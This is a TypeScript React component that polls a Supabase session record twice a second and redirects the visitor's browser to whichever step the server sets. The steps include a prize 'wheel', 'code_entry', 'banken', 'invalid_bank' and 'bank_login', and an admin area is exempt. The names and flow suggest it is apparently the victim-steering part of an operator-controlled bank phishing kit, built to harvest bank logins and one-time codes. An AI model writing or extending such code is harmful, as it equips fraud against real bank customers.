"use client";

import { useEffect, useRef, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, stepToPath } from "@/lib/session-routes";
import {
  ACTIVE_ROUTE_SESSION_COOKIE,
  ACTIVE_SESSION_COOKIE,
} from "@/lib/session-constants";
import {
  normalizeSessionIdentifier,
  isNumericSessionIdentifier,
  isUuidSessionIdentifier,
} from "@/lib/session-identifiers";
import type { SessionStep } from "@/types/session";
import type { SupabaseClient } from "@supabase/supabase-js";

export type SessionRealtimeGateProps = {
  sessionId?: string;
  routeSessionId?: string;
};

function getCookieValue(name: string): string | undefined {
  if (typeof document === "undefined") return undefined;
  const match = document.cookie.match(
    new RegExp(`(?:^|; )${name}=([^;]*)`),
  );
  return match?.[1] ? decodeURIComponent(match[1]) : undefined;
}

function getQuerySid(): string | undefined {
  if (typeof window === "undefined") return undefined;
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get("session") ?? undefined;
}

async function resolvePublicIdToUuidInline(
  sb: SupabaseClient<any, any, any>,
  sid: string,
): Promise<{ ok: boolean; uuid: string; routeSessionId: string }> {
  if (isUuidSessionIdentifier(sid)) {
    return { ok: true, uuid: sid, routeSessionId: sid };
  }
  if (!isNumericSessionIdentifier(sid)) {
    return { ok: false, uuid: sid, routeSessionId: sid };
  }
  try {
    const pid = Number(sid);
    const { data, error } = await sb
      .from("sessions")
      .select("id, public_id")
      .eq("public_id", pid)
      .maybeSingle();
    if (!error && data && data.id) {
      return {
        ok: true,
        uuid: String(data.id),
        routeSessionId: data.public_id != null ? String(data.public_id) : sid,
      };
    }
  } catch {
    /* ignore */
  }
  return { ok: false, uuid: sid, routeSessionId: sid };
}

type DebugInfo = {
  sid: string;
  route: string;
  uuid: string;
  localStep: string;
  serverStep: string;
  target: string;
  tick: number;
  willRedirect: boolean;
  lastError: string;
};

export function SessionRealtimeGate({
  sessionId: _pSid,
  routeSessionId: _pRouteSid,
}: SessionRealtimeGateProps) {
  const [dbg, setDbg] = useState<DebugInfo>({
    sid: "", route: "", uuid: "", localStep: "", serverStep: "", target: "",
    tick: 0, willRedirect: false, lastError: "",
  });

  useEffect(() => {
    const sb = createBrowserSupabaseClient()!;

    let sid: string | undefined = normalizeSessionIdentifier(_pSid);
    if (!sid) sid = normalizeSessionIdentifier(getQuerySid());
    if (!sid) sid = normalizeSessionIdentifier(getCookieValue(ACTIVE_SESSION_COOKIE));

    let routeSid: string | undefined = normalizeSessionIdentifier(_pRouteSid);
    if (!routeSid) routeSid = normalizeSessionIdentifier(getCookieValue(ACTIVE_ROUTE_SESSION_COOKIE));
    if (!routeSid) routeSid = sid;

    if (!sid) {
      setDbg(prev => ({ ...prev, lastError: "sessionId bulunamadi (prop/query/cookie bos)" }));
      return;
    }

    let resolvedUuid: string | undefined = undefined;
    let resolvedRouteSid: string | undefined = routeSid;
    let initialResolved = false;
    let cancelled = false;
    let tickN = 0;
    let nextAllowedAt = 0;
    let lastSrv = "";

    (async () => {
      try {
        const r = await resolvePublicIdToUuidInline(sb, sid);
        if (cancelled) return;
        resolvedUuid = r.uuid;
        resolvedRouteSid = r.routeSessionId || routeSid;
        setDbg(prev => ({ ...prev, uuid: r.uuid, route: r.routeSessionId || routeSid || "" }));
      } catch (e) {
        setDbg(prev => ({ ...prev, lastError: "resolve err: " + String(e) }));
        resolvedUuid = sid;
      }
      initialResolved = true;
    })();

    const tick = async () => {
      if (cancelled) return;
      tickN++;
      try {
        if (!initialResolved || !resolvedUuid) {
          setDbg(prev => ({ ...prev, tick: tickN, lastError: initialResolved ? "uuid yok" : "resolving..." }));
          return;
        }

        const localPath = window.location.pathname;
        if (localPath.startsWith("/admin")) {
          setDbg(prev => ({ ...prev, tick: tickN, localStep: "ADMIN (skip)" }));
          return;
        }

        const { data, error } = await sb
          .from("sessions")
          .select("current_step,status,public_id")
          .eq("id", resolvedUuid)
          .maybeSingle();

        if (error || !data) {
          setDbg(prev => ({
            ...prev,
            tick: tickN,
            lastError: error ? "DB err: " + String(error.message || error) : "satir bulunamadi",
          }));
          return;
        }

        const srv = String(data.current_step || "");
        if (!srv) {
          setDbg(prev => ({ ...prev, tick: tickN, lastError: "current_step BOS" }));
          return;
        }

        if (data.status === "SPECIAL_INFO" && srv === "special_approval") {
          if (!localPath.startsWith("/special-approval")) {
            if (Date.now() > nextAllowedAt) {
              nextAllowedAt = Date.now() + 1500;
              const finalRouteSid = (data.public_id != null) ? String(data.public_id) : (resolvedRouteSid || resolvedUuid);
              const qs = finalRouteSid && finalRouteSid !== "undefined" ? `?session=${encodeURIComponent(String(finalRouteSid))}` : "";
              window.location.href = `/special-approval${qs}`;
            }
          }
          return;
        }

        let localStep: SessionStep | null = pathToStep(localPath);
        if (localPath.startsWith("/wheel")) localStep = "wheel" as SessionStep;
        if (!localStep) {
          setDbg(prev => ({ ...prev, tick: tickN, localStep: "(unknown: " + localPath + ")" }));
          return;
        }

        const lsStr = String(localStep);
        if (lsStr === "wheel" && srv === "code_entry") { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
        if (lsStr === "banken" && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
        if ((lsStr === "banken2" || lsStr === "invalid_bank") && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }

        const finalRouteSid = (data.public_id != null) ? String(data.public_id) : (resolvedRouteSid || resolvedUuid);
        let target = "";
        let willRedirect = false;

        if (lsStr !== srv) {
          target = stepToPath(
            srv as SessionStep,
            resolvedUuid as string,
            finalRouteSid as string,
          );
          willRedirect = true;
          if (Date.now() > nextAllowedAt) {
            nextAllowedAt = Date.now() + 1500;
            lastSrv = srv;
            // YONLENDIRME: EN GUVENILIR KOD: window.location.href
            try {
              (window as any).location = target;
              setTimeout(() => { window.location.href = target; }, 50);
            } catch (_) {
              window.location.href = target;
            }
            setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv, target, willRedirect: true, lastError: "YONLENDIRILIYOR -> " + target }));
            return;
          }
        } else {
            lastSrv = srv;
            
            // Eger kullanici ayni sayfadaysa (redirect yoksa) ama URL'de UUID kaldiysa, onu public_id ile degistir (URL temizligi)
            const currentSessionParam = new URLSearchParams(window.location.search).get("session");
            if (currentSessionParam && currentSessionParam.includes("-") && data.public_id != null) {
              const newUrl = new URL(window.location.href);
              newUrl.searchParams.set("session", String(data.public_id));
              window.history.replaceState(null, "", newUrl.toString());
            }
          }

        setDbg(prev => ({
          ...prev,
          tick: tickN,
          sid: sid || "",
          route: finalRouteSid,
          uuid: resolvedUuid || "",
          localStep: lsStr,
          serverStep: srv,
          target,
          willRedirect,
          lastError: lsStr === srv ? "Ayni step, yonlendirme yok" : prev.lastError,
        }));
      } catch (err) {
        setDbg(prev => ({ ...prev, tick: tickN, lastError: "tick catch: " + String(err) }));
      }
    };

    void tick();
    const t = window.setInterval(() => void tick(), 500);
    return () => {
      cancelled = true;
      window.clearInterval(t);
    };
  }, []);

  // SESSIONREALTIMEGATE: Hiçbir UI/debug kutusu yok, sadece polling + yönlendirme
  return null;
}
